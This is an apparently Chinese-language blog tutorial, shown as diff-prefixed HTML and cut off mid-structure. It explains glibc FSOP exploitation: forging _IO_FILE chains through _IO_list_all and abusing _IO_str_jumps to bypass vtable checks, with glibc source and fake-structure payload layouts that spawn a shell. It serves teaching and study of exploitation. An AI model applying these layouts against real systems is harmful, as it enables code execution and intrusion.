+<p>FSOP 的核心思想就是<strong>劫持<code>_IO_list_all</code> 来伪造链表和其中的_IO_FILE 项（包括file和vtable）</strong>。只要劫持了<code>_IO_list_all</code>并在对应位置伪造_IO_FILE项，就相当于劫持了所有关于文件的数据和操作。</p>
+<p>单纯的伪造只是构造了数据，不能达到<strong>劫持程序流程</strong>的目的。FSOP 选择调用<code>_IO_flush_all_lockp</code>来劫持程序流，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>，最终的效果就是执行<code>_IO_overflow(fp)</code>。</p>
+<p>因此如果能将<code>_IO_overflow</code>修改为<code>system</code>，将<code>file</code>结构的<code>flag</code>修改为<code>&quot;/bin/sh\x00&quot;</code>，就可以通过<code>_IO_overflow(fp)</code>执行<code>system(&quot;/bin/sh\x00&quot;)</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<span class="comment">//伪造的IO_FILE要满足的条件</span></span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) </span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">       fp=fp-&gt;_chain;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面代码可以看到，要执行<code>_IO_overflow(fp)</code>，伪造的IO_FILE需要满足以下条件：</p>
+<ol>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ol>
+<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
+<ol>
+<li>当 libc检测到<strong>内存错误</strong>， 执行 abort 流程时（可以通过malloc等函数触发）（glibc-2.26删除）</li>
+<li>当执行 exit 函数时</li>
+<li>当执行流从 main 函数返回时</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain = chunk_addr <span class="comment">//伪造_chain</span></span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = heap_addr</span><br><span class="line">&#125;</span><br><span class="line">heap_addr</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="glibc2-24后的IO-FILE利用"><a href="#glibc2-24后的IO-FILE利用" class="headerlink" title="glibc2.24后的IO_FILE利用"></a>glibc2.24后的IO_FILE利用</h2><p>从glibc2.24开始，加入了对vtable的检查，会对vtable的合法性进行检查。glibc中有一段完整的内存存放着各个vtable，<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code> 分别指向第一个和最后一个vtable，只有其中的vtable和外部的合法vtable可以通过检查正常使用，否则会引发abort。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个检查的调用流程如下（IO函数使用宏调用）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) <span class="comment">//检查在这里</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在调用vtable中函数时会对其vtable合法性进行检查。</p>
+<p>因此我们伪造的<code>vtable</code>要在<code>glibc</code>的<code>vtable</code>段中，从而得以绕过该检查。<br>目前来说，有四种思路：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数和<code>_IO_str_finish()</code>函数与利用<code>_IO_wstr_jumps</code>中对应的这两种函数。</p>
+<h3 id="IO-str-jumps的FSOP-2-28及以后失效"><a href="#IO-str-jumps的FSOP-2-28及以后失效" class="headerlink" title="_IO_str_jumps的FSOP(2.28及以后失效)"></a>_IO_str_jumps的FSOP(2.28及以后失效)</h3><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个<code>vtable</code>可以通过对vtable的检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish), <span class="comment">//this</span></span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow), <span class="comment">//this</span></span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>下面是一些相关的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> 	_IO_alloc_type _allocate_buffer;</span><br><span class="line"> 	_IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> 	<span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line"> 	<span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>由于libc中没有_IO_str_jumps的符号，因此需要自己找</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc.address = libc_base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IO_str_jumps</span>():</span><br><span class="line">    IO_file_jumps_addr = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow_addr = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> ref <span class="keyword">in</span> libc.search(p64(IO_str_underflow_addr-libc.address)):</span><br><span class="line">        possible_IO_str_jumps_addr = ref - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:</span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_addr</span><br></pre></td></tr></table></figure>
+
+<p>如果能设置vtable为<code>_IO_str_jumps</code>，那就可以调用其中的函数，如果其中的函数有问题，自然就可以利用。</p>
+<hr>
+<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_overflow</code>就有可以利用的地方。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
+
+<p>利用下面语句可以劫持程序流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_buf= (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>
+
+<p>思路是绕过前面的检查，并将<code>fp-&gt;_s._allocate_buffer</code>修改为<code>system</code>,将<code>new_size</code>修改为<code>&quot;/bin/sh&quot;</code>的地址（也可直接改为one_gadget）</p>
+<p>具体构造：</p>
+<ol>
+<li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code>为假</li>
+<li><code>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li>
+<li><code>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)</code>为假</li>
+<li><code>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 </code>不能为负数</li>
+<li><code>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>; 应当指向/bin/sh字符串对应的地址</li>
+<li><code>fp+0xe0</code>（<code>_allocate_buffer</code>）指向system地址</li>
+</ol>
+<p>当然也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>
+<ol>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) <span class="comment">// 2,</span></span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps <span class="comment">//chunk_addr + 0xd8 ~ +0xe0(glibc2.24之前可以)</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._allocate_buffer</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_finish</code>也可以利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样也是对其中函数指针的利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过条件：</p>
+<ol>
+<li>_IO_buf_base 不为空</li>
+<li>_flags &amp; _IO_USER_BUF(0x01) 为假，即flag字段不包含IO_USER_BUF</li>
+</ol>
+<p>现在要让程序执行 <code>_IO_str_finish</code> ，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理的方法，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p>
+<p>也就是说，如果设置的vtable是<code>_IO_str_jumps-0x8</code>，那么在<code>vtable+0x18</code>的位置就是 <code>_IO_str_finish</code>（原本应该是 <code>_IO_str_overflow</code>），这样就可以通过 <code>_IO_flush_all_lockp</code>执行到 <code>_IO_str_finish</code>，而且由于这个vtable在合法范围内，因此能过检测。</p>
+<p>不过我们也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>
+<ol>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ol>
+<p>构造如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = bin_sh_addr,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps<span class="number">-8</span> <span class="comment">//chunk_addr + 0xd8 ~ +0xe0 (2.24之前可以)</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : <span class="number">0x0</span></span><br><span class="line">+<span class="number">0xe8</span> ~ +<span class="number">0xf0</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._free_buffer</span></span><br></pre></td></tr></table></figure>
+
+<p>而在<code>libc-2.28</code>及以后，由于不再使用偏移找<code>_s._allocate_buffer</code>和<code>_s._free_buffer</code>，而是直接用<code>malloc</code>和<code>free</code>代替，所以<code>FSOP</code>也失效了。</p>
+<h3 id="IO-wide-data（House-of-Apple）"><a href="#IO-wide-data（House-of-Apple）" class="headerlink" title="_IO_wide_data（House of Apple）"></a>_IO_wide_data（House of Apple）</h3><p><code>struct _IO_wide_data *_wide_data</code>在<code>_IO_FILE</code>中的偏移为<code>0xa0</code></p>
+<p><code>_IO_wide_data</code>的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span> 			<span class="comment">//0x00</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span>				<span class="comment">//0x08</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;  